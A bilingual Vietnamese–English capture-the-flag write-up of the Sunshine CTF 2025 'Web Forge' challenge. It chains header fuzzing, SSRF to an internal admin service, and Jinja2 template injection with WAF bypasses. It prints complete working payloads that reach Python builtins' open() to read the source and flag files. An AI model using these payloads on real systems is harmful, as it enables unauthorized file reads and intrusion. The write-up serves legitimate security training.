# **Sunshine CTF 2025 — Web Forge**

**Thể loại:** Web

**Độ khó:** Khó

---

## Tổng quan thử thách

Thử thách "Web Forge" là một bài tập khai thác web đa tầng, yêu cầu người chơi kết hợp nhiều kỹ thuật khác nhau. Quá trình này bắt đầu bằng việc vượt qua một cơ chế xác thực dựa trên HTTP header, dẫn đến việc phát hiện một công cụ SSRF. Công cụ này sau đó được sử dụng để truy cập một dịch vụ admin nội bộ, nơi ẩn chứa một lỗ hổng Server-Side Template Injection (SSTI). Phần khó nhất của thử thách nằm ở việc phân tích và bypass một Web Application Firewall (WAF) cực kỳ tinh vi được thiết kế để bảo vệ endpoint SSTI, cuối cùng dẫn đến khả năng đọc file tùy ý (Arbitrary File Read) và chiếm được flag.

---

## Mục tiêu

Mục tiêu chính là chiếm được flag được giấu trên server bằng cách:

1. Tìm và bypass cơ chế xác thực để truy cập công cụ SSRF.
2. Khai thác lỗ hổng SSRF để tương tác với một dịch vụ web nội bộ.
3. Phát hiện và khai thác lỗ hổng SSTI trên dịch vụ nội bộ.
4. Bẻ gãy hoàn toàn các lớp phòng thủ của WAF để đạt được khả năng đọc file.
5. Sử dụng khả năng đọc file để trinh sát hệ thống, tìm và đọc mã nguồn, từ đó xác định vị trí file flag và chiếm lấy nó.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức sâu rộng về:

- **Fuzzing:** Sử dụng các công cụ như Burp Suite Intruder hoặc `ffuf` để tự động hóa việc kiểm tra hàng loạt khả năng (ví dụ: tên HTTP header, số cổng).
- **Server-Side Request Forgery (SSRF):** Hiểu cách hoạt động của SSRF và cách sử dụng nó để truy cập các tài nguyên mạng nội bộ (localhost).
- **Server-Side Template Injection (SSTI):** Nhận biết các triệu chứng của SSTI, cách xác nhận và xây dựng các payload khai thác, đặc biệt là trong môi trường Jinja2 (Python/Flask).
- **Web Application Firewall (WAF) Bypass:** Có kinh nghiệm và tư duy phân tích để đối phó với các bộ lọc phức tạp, bao gồm các kỹ thuật che giấu (obfuscation) như nối chuỗi, mã hóa ký tự, và các phương pháp tấn công gián tiếp.
- **Python và Flask:** Hiểu biết về cấu trúc đối tượng nội bộ của Python và các đối tượng toàn cục trong môi trường Flask/Jinja2 là một lợi thế cực lớn.

---

## Phân tích và hướng tiếp cận

Thử thách này là một cuộc đấu trí có hệ thống, nơi mỗi thông báo lỗi là một manh mối dẫn đến bước tiếp theo.

1. **Giai đoạn 1: Fuzzing Header**
    - Endpoint `/fetch` trả về lỗi `403` và gợi ý về "access header". File `/robots.txt` xác nhận cần một header đặc biệt có giá trị `true`.
    - Hướng tiếp cận: Fuzz tên HTTP header bằng Burp Intruder để tìm ra header đúng là `Allow`.
2. **Giai đoạn 2: SSRF và Khám phá Dịch vụ Nội bộ**
    - Sau khi truy cập `/fetch`, chúng ta có một công cụ SSRF. Mục tiêu là truy cập `/admin`.
    - Thử SSRF đến `localhost` trên các cổng phổ biến sẽ phát hiện ra dịch vụ admin đang chạy trên `localhost:8000`.
    - Dịch vụ admin yêu cầu tham số `?template=`. Thử nghiệm ban đầu cho thấy nó không phải là LFI mà là SSTI. Payload `{{7*7}}` trả về `49`, xác nhận lỗ hổng.
3. **Giai đoạn 3: Cuộc chiến với WAF**
    - Đây là phần cốt lõi của thử thách. Mọi payload SSTI tiêu chuẩn đều bị chặn bởi thông báo "Nope.".
    - Quá trình này đòi hỏi một loạt các bài test chẩn đoán, mỗi bài test chỉ kiểm tra một giả thuyết duy nhất. Chúng ta phải xác định:
        - **Đối tượng "sạch":** Tìm ra các đối tượng toàn cục mà WAF bỏ qua (trong trường hợp này là `cycler` và `joiner`).
        - **Từ khóa bị chặn:** Phát hiện các từ khóa bị cấm như `_`, `.`, `init`, `globals`, `os`, `popen`, `open`, `app`, `read`.
        - **Hành vi bị chặn:** Nhận ra WAF không chỉ chặn từ khóa mà còn chặn các hành vi như gọi hàm `popen()` hoặc phương thức `.read()`.
    - **Xây dựng kỹ thuật Bypass:**
        - Sử dụng mã hóa hex (`\\x5f`, `\\x2e`) để bypass bộ lọc ký tự `_` và `.`.
        - Sử dụng toán tử nối chuỗi (`~`) để bypass bộ lọc từ khóa (`'in'~'it'`, `'glob'~'als'`, `'a'~'pp'`).
        - Sử dụng filter `|join` để thay thế phương thức `.read()` bị chặn.
4. **Giai đoạn 4: Trinh sát và Chiếm Flag**
    - Sau khi xây dựng được một payload đọc file hoàn chỉnh, chúng ta phải đối mặt với việc không biết đường dẫn file.
    - Hướng tiếp cận: Đọc các file ảo trong `/proc/self/` để thu thập thông tin. Đọc `/proc/self/cmdline` đã tiết lộ tên và vị trí của file mã nguồn là `/opt/chal/app.py`.
    - Sử dụng payload đọc file để đọc mã nguồn. Mã nguồn sau đó tiết lộ vị trí cuối cùng của file flag là `flag.txt` trong cùng thư mục.
    - Xây dựng payload cuối cùng để đọc file flag.

---

## Kịch bản giải mã (Exploit)

Không có một kịch bản duy nhất cho toàn bộ quá trình, nhưng đây là các payload quan trọng đã được sử dụng trong các bước cuối cùng thông qua Burp Suite Repeater, được gửi đến endpoint `https://wormhole.sunshinectf.games/fetch` với header `Allow: true`.

### Payload cuối cùng để đọc mã nguồn `/opt/chal/app.py`

Payload này kết hợp tất cả các kỹ thuật bypass đã được phát hiện để đọc file mã nguồn.

```visual-basic
POST /fetch HTTP/2
Host: wormhole.sunshinectf.games
Content-Type: application/x-www-form-urlencoded
Allow: true
Content-Length: 184

url=http://localhost:8000/admin?template={{ (cycler['\\x5f\\x5fin'~'it\\x5f\\x5f']['\\x5f\\x5fglob'~'als\\x5f\\x5f']['\\x5f\\x5fbuilt'~'ins\\x5f\\x5f']['op'~'en']('/opt/chal/a'~'pp'~'\\x2e'~'py'))|join }}

```

### Phân tích mã nguồn

Mã nguồn trả về đã tiết lộ hai bí mật quan trọng:

1. **Logic WAF:**
    
    ```python
    if '.' in template_input or '_' in template_input:
        return "Nope."
    ```
    
2. **Vị trí Flag:**
    
    ```python
    FLAG = open("flag.txt").read()
    ```
    

### Payload cuối cùng để đọc flag `/opt/chal/flag.txt`

Dựa trên thông tin từ mã nguồn, chúng ta xây dựng payload cuối cùng để đọc file `flag.txt`.

```visual-basic
POST /fetch HTTP/2
Host: wormhole.sunshinectf.games
Content-Type: application/x-www-form-urlencoded
Allow: true
Content-Length: 184

url=http://localhost:8000/admin?template={{ (cycler['\\x5f\\x5fin'~'it\\x5f\\x5f']['\\x5f\\x5fglob'~'als\\x5f\\x5f']['\\x5f\\x5fbuilt'~'ins\\x5f\\x5f']['op'~'en']('/opt/chal/flag'~'\\x2e'~'txt'))|join }}

```

**Kết quả (Flag)**

Thực thi request cuối cùng này đã trả về nội dung của file flag.

<img width="1510" height="847" alt="image" src="https://github.com/user-attachments/assets/38280166-156b-43fd-9b2d-45536571011d" />


`sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}`

---

## Ghi chú và mẹo

- Thử thách này là một ví dụ điển hình về việc "chậm mà chắc". Mỗi thất bại đều cung cấp thông tin giá trị. Việc thực hiện các bài test chẩn đoán nhỏ, chỉ kiểm tra một giả thuyết duy nhất, là chìa khóa để đánh bại các hệ thống phòng thủ phức tạp.
- Khi đối mặt với một WAF SSTI, đừng bao giờ cho rằng nó chỉ chặn các từ khóa đơn giản. Hãy chuẩn bị tinh thần để đối phó với các bộ lọc hành vi, theo dõi đối tượng (taint tracking), và các quy tắc dựa trên ngữ cảnh.
- Việc khai thác các đối tượng toàn cục ít được biết đến (`cycler`, `joiner`) thường là một điểm yếu mà các quản trị viên bỏ sót khi cấu hình sandbox.
- Luôn nhớ rằng `FileNotFoundError` có thể được che giấu dưới một thông báo lỗi chung. Nếu bạn tin rằng payload của mình đã đúng, hãy thử đọc một file chắc chắn tồn tại (như `/etc/passwd`) để xác minh khả năng đọc file trước khi đi tìm mục tiêu chính.

---

# ENGLISH VERSION

**Category:** Web

**Difficulty:** Hard

---

## Challenge Overview

The "Web Forge" challenge is a multi-stage web exploitation exercise that requires players to combine several different techniques. The process begins by bypassing an HTTP header-based authentication mechanism, leading to the discovery of an SSRF tool. This tool is then used to access an internal admin service, which harbors a Server-Side Template Injection (SSTI) vulnerability. The core of the challenge lies in analyzing and bypassing a highly sophisticated Web Application Firewall (WAF) designed to protect the SSTI endpoint, ultimately leading to Arbitrary File Read and flag capture.

---

## Objective

The primary objective is to capture the flag hidden on the server by:

1. Finding and bypassing the authentication mechanism to access the SSRF tool.
2. Exploiting the SSRF vulnerability to interact with an internal web service.
3. Discovering and exploiting the SSTI vulnerability on the internal service.
4. Systematically breaking all layers of the WAF's defenses to achieve arbitrary file read.
5. Using the file read capability for system reconnaissance, reading the application's source code, and thereby identifying the flag's location to capture it.

---

## Required Knowledge

To solve this challenge, players need extensive knowledge of:

- **Fuzzing:** Using tools like Burp Suite Intruder or `ffuf` to automate the process of testing numerous possibilities (e.g., HTTP header names, port numbers).
- **Server-Side Request Forgery (SSRF):** Understanding how SSRF works and how to use it to access internal network resources (localhost).
- **Server-Side Template Injection (SSTI):** Recognizing the symptoms of SSTI, confirming the vulnerability, and building exploit payloads, especially within a Jinja2 (Python/Flask) environment.
- **Web Application Firewall (WAF) Bypass:** Possessing the experience and analytical mindset to deal with complex filters, including obfuscation techniques like string concatenation, character encoding, and indirect attack methods.
- **Python and Flask:** Familiarity with Python's internal object structure and the global objects available in a Flask/Jinja2 context is a significant advantage.

---

## Analysis and Approach

This challenge is a systematic puzzle where each error message is a clue to the next step.

1. **Phase 1: Header Fuzzing**
    - The `/fetch` endpoint returns a `403` error and hints at an "access header." The `/robots.txt` file confirms the need for a special header with the value `true`.
    - **Approach:** Fuzz the HTTP header name using Burp Intruder, which quickly reveals the correct header is `Allow`.
2. **Phase 2: SSRF and Internal Service Discovery**
    - After accessing `/fetch`, we have an SSRF tool. The goal is to access `/admin`.
    - Attempting SSRF to `localhost` on common ports reveals an admin service running on `localhost:8000`.
    - The admin service requires a `?template=` parameter. Initial tests show it's not LFI, but SSTI. The payload `{{7*7}}` returns `49`, confirming the vulnerability.
3. **Phase 3: The War Against the WAF**
    - This is the core of the challenge. All standard SSTI payloads for RCE or file read are blocked with a "Nope." message, indicating a powerful WAF.
    - This process required a long series of diagnostic tests, each designed to test a single hypothesis. We had to determine:
        - **"Clean" Objects:** Find global objects the WAF ignored (in this case, `cycler` and `joiner`).
        - **Blocked Keywords:** Detect a blacklist of keywords including `_`, `.`, `init`, `globals`, `os`, `popen`, `open`, `app`, and `read`.
        - **Blocked Behaviors:** Realize the WAF blocked not just keywords but also behaviors, such as calling the `popen()` function or the `.read()` method.
    - **Building Bypass Techniques:**
        - Use hex encoding (`\\x5f`, `\\x2e`) to bypass the `_` and `.` character filters.
        - Use the string concatenation operator (`~`) to bypass keyword filters (`'in'~'it'`, `'glob'~'als'`, `'a'~'pp'`).
        - Use the `|join` filter as a clever replacement for the blocked `.read()` method.
4. **Phase 4: Reconnaissance and Flag Capture**
    - After crafting a perfect file-read payload, we faced the problem of not knowing the file path.
    - **Approach:** Read virtual files in `/proc/self/` to gather intel. Reading `/proc/self/cmdline` revealed the application's name and location: `/opt/chal/app.py`.
    - Use the file-read payload to read the source code. The source code then revealed the final location of the flag file.

---

## The Exploit

While there isn't a single script for the entire process, these are the critical final payloads used via Burp Suite Repeater, sent to the `https://wormhole.sunshinectf.games/fetch` endpoint with the `Allow: true` header.

### Final Payload to Read Source Code (`/opt/chal/app.py`)

This payload combines all discovered bypass techniques to read the application's source code.

```
POST /fetch HTTP/2
Host: wormhole.sunshinectf.games
Content-Type: application/x-www-form-urlencoded
Allow: true
Content-Length: 184

url=http://localhost:8000/admin?template={{ (cycler['\\x5f\\x5fin'~'it\\x5f\\x5f']['\\x5f\\x5fglob'~'als\\x5f\\x5f']['\\x5f\\x5fbuilt'~'ins\\x5f\\x5f']['op'~'en']('/opt/chal/a'~'pp'~'\\x2e'~'py'))|join }}

```

### Source Code Analysis

The returned source code revealed two critical secrets:

1. **The WAF Logic:**
    
    ```python
    if '.' in template_input or '_' in template_input:
        return "Nope."
    
    ```
    
2. **The Flag Location:**
    
    ```python
    FLAG = open("flag.txt").read()
    
    ```
    

### Final Payload to Read the Flag (`/opt/chal/flag.txt`)

Based on the information from the source code, we constructed the final payload to read `flag.txt`.

```
POST /fetch HTTP/2
Host: wormhole.sunshinectf.games
Content-Type: application/x-www-form-urlencoded
Allow: true
Content-Length: 184

url=http://localhost:8000/admin?template={{ (cycler['\\x5f\\x5fin'~'it\\x5f\\x5f']['\\x5f\\x5fglob'~'als\\x5f\\x5f']['\\x5f\\x5fbuilt'~'ins\\x5f\\x5f']['op'~'en']('/opt/chal/flag'~'\\x2e'~'txt'))|join }}

```

## Flag

Executing this final request returned the contents of the flag file.

`sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}`

---

## Notes and Tips

- This challenge is a prime example of "slow and steady wins the race." Every failure provides valuable information. Performing small, atomic diagnostic tests that check only a single hypothesis is the key to defeating complex defense systems.
- When facing an SSTI WAF, never assume it only blocks simple keywords. Be prepared to deal with behavioral filters, object taint tracking, and context-aware rules.
- Exploiting lesser-known global objects (`cycler`, `joiner`) is often a blind spot that administrators miss when configuring a sandbox.
- Always remember that a `FileNotFoundError` might be masked by a generic error message. If you believe your payload is correct, try reading a file that is guaranteed to exist (like `/etc/passwd`) to verify your file read capability before hunting for the main target.
